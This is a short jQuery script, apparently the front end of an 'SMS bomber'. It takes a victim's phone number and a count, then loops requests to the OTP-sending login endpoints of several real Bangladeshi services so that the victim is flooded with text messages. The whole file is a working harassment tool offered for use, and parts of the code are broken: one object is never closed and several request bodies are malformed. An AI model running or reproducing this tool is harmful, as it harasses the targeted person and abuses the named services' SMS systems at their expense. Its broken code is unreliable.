// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
                {
                    method: "POST",
                    url: `http://nesco.sslwireless.com/api/v1/login`,
                    body: 'phone_number":${mobile}',
                {
                    method: 'POST',
                    url: "https://api.bongo-solutions.com/auth/api/login/send-otp",
                    body: `msisdn=88${mobile}&operator=all`
                },
                {
                    method: 'GET',
                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
                },
                {
                    method: 'GET',
                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                },
                {
                    url: "https://web-api.binge.buzz/api/v3/otp/send",
                    method: "POST",
                    body: `phone=$88{mobile}`
                }

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})
